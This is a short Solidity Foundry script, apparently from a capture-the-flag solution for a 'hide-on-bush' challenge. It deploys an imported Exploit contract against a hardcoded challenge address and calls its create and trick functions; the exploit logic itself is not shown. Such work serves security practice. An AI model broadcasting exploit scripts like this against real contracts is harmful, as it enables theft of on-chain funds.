// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "../src/hide-on-bush/Challenge.sol";
import "../src/hide-on-bush/Exploitor.sol";

contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        Challenge challenge = Challenge(
            address(0x0a8DEaEF401040E936ba2b972210dA1C89D0d06C)
        );
        vm.startBroadcast();
        Exploit exploitor = new Exploit(address(challenge));
        exploitor.create();
        exploitor.trick();
        // exploitor.hide();
        vm.stopBroadcast();
    }
}
